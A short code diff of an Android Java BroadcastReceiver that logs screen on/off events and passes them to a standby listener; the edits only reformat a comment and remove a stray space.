@@ -18,7 +18,9 @@ import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.util.Check;
 
 public class BSt extends BroadcastReceiver {
-	/** The Constant TAG. */
+	/**
+	 * The Constant TAG.
+	 */
 	private static final String TAG = "BroadcastMonitorStandby"; //$NON-NLS-1$
 
 	/*
@@ -39,7 +41,7 @@ public class BSt extends BroadcastReceiver {
 		final boolean on = intent.getAction().equals(Intent.ACTION_SCREEN_ON);
 
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " standby notification, action: " + intent.getAction() + "standBy is:" + on );//$NON-NLS-1$
+			Check.log(TAG + " standby notification, action: " + intent.getAction() + "standBy is:" + on);//$NON-NLS-1$
 		}
 
 		ListenerStandby.self().dispatch(new Standby(on));
